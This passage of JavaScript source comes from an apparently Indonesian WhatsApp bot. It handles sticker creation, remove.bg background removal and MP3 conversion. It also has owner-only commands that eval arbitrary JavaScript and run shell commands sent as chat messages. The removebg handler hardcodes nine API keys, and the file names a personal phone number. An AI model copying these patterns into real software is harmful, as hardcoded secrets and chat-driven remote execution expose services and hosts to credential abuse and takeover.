                 return m.reply(`Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`) 
                 }
                 }
                 break
      case 'swm': case 'stickerwm': case 'take':
                if (!db.data.users[m.sender].registered) return m.reply(mess.regis)
                if (!quoted) return m.reply('mana gambarnya')
       	     if (!args.join(" ")) return m.reply(`Example :\nswm Resta | Gans`)
                const swn = args.join(" ")
                const pcknm = swn.split("|")[0];
                const atnm = swn.split("|")[1];
                m.reply(mess.wait)
                if (quoted.msg === true) {
                Resta.downloadAndSaveMediaMessage(quoted, "gifee")
                Resta.sendMessage(m.chat, {sticker:fs.readFileSync("gifee.webp")},{quoted:m})
                } else if (/image/.test(mime)) {
                let media = await quoted.download()
                let encmedia = await Resta.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
                fs.unlinkSync(encmedia)
                } else if (/video/.test(mime)) {
                if ((quoted.msg || quoted).seconds > 11) return m.reply('Maksimal 10 detik!')
                let media = await quoted.download()
                let encmedia = await Resta.sendVideoAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
                fs.unlinkSync(encmedia)
                } else {
                m.reply(`Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`)
                }
                break
      case 'imagenobg':
      case 'removebg': case 'remove-bg':
       	     if (!db.data.users[m.sender].registered) return m.reply(mess.regis)
	            if (!quoted) throw m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
	            if (!/image/.test(mime)) throw m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
	            if (/webp/.test(mime)) throw m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
	            let remobg = require('remove.bg')
	            let apirnobg = ['q61faXzzR5zNU6cvcrwtUkRU','S258diZhcuFJooAtHTaPEn4T','5LjfCVAp4vVNYiTjq9mXJWHF','aT7ibfUsGSwFyjaPZ9eoJc61','BY63t7Vx2tS68YZFY6AJ4HHF','5Gdq1sSWSeyZzPMHqz7ENfi8','86h6d6u4AXrst4BVMD9dzdGZ','xp8pSDavAgfE5XScqXo9UKHF','dWbCoCb3TacCP93imNEcPxcL']
	            let apinobg = apirnobg[Math.floor(Math.random() * apirnobg.length)]
	            hmm = './src/remobg-'+getRandom('')
	            localFile = await Resta.downloadAndSaveMediaMessage(qmsg, hmm)
	            outputFile = './src/hremo-'+getRandom('.png')
	            m.reply(mess.wait)
	            remobg.removeBackgroundFromImageFile({
	            path: localFile,
	            apiKey: apinobg,
	            size: "regular",
	            type: "auto",
	            scale: "100%",
	            outputFile 
	            }).then(async result => {
	            Resta.sendMessage(m.chat, {image: fs.readFileSync(outputFile), caption: mess.success}, { quoted : m })
	            fs.unlinkSync(localFile)
	            fs.unlinkSync(outputFile)
	            })
	            break
    case 'tomp3': {
	if (!db.data.users[m.sender].registered) return m.reply(mess.regis)
  if (/document/.test(mime)) throw m.reply(`Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`) 
  if (!/video/.test(mime) && !/audio/.test(mime)) throw m.reply(`Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`) 
  if (!quoted) throw m.reply (`Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`) 
  m.reply(mess.wait)
  let media = await quoted.download()
  let audio = await toAudio(media, 'mp4')
  Resta.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By ${Resta.user.name}.mp3`}, { quoted : m })
  }
  break
      

default:
if (budy.startsWith('=>')) {
                    if (!isOwner) return m.reply(mess.botOwner)
                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2)
                        bang = util.format(sat)
                            if (sat == undefined) {
                                bang = util.format(sul)
                            }
                            return m.reply(bang)
                    }
                    try {
                        m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
                    } catch (e) {
                        m.reply(String(e))
                    }
                }
 
  if (budy.startsWith('>')) {
  if (!isOwner) return m.reply(mess.botOwner)
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))}}

if (budy.startsWith("$")) {
  if (!isOwner) return m.reply(mess.botOwner)
  const command = budy.slice(1).trim();
  if (command.length === 0) {
    return m.reply('Mohon masukkan perintah yang valid');
  }
  const { exec } = require('child_process');
  exec(command, (err, stdout, stderr) => {
    if (err) {
      console.error(err);
      return m.reply(`Terjadi kesalahan saat menjalankan perintah: ${err.message}`);
    }
    if (stderr) {
      console.error(stderr);
      return m.reply(`Perintah berhasil dijalankan, tetapi terdapat pesan error: ${stderr}`);
    }
    if (stdout) {
      return m.reply(`${stdout}`);
    }
    m.reply('Perintah berhasil dijalankan');
  });
}

}
// Anti Tag ( FenZo||77+ )
const listTag = ["62895611406599@s.whatsapp.net"]
if (m.mtype === 'extendedTextMessage' && m.message.extendedTextMessage && m.message.extendedTextMessage.contextInfo && m.message.extendedTextMessage.contextInfo.participant) {
  const partiNum = m.message.extendedTextMessage.contextInfo.participant
  if (listTag.includes(partiNum)) {
    if (!m.isGroup) return
    if (m.key.fromMe) return
    Resta.readMessages(m.chat, m.sender, [m.key.id])
    Resta.sendImageAsSticker(m.chat, `https://telegra.ph/file/0c3184d777d56bfe77dab.png`, m, {packname: packname, author: author})
  }
}
// Antitag Via Tag ( FenZo||77+ )
if (budy.includes("@62895611406599")) {
if (!m.isGroup) return
if (m.key.fromMe) return
Resta.readMessages(m.chat, m.sender, [m.key.id])
Resta.sendImageAsSticker(m.chat, `https://telegra.ph/file/0c3184d777d56bfe77dab.png`, m, {packname: packname, author: author})
}
} catch (err) { 
console.log("error di bagian resta.js "+util.format(err))
}
}
let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.cyanBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})
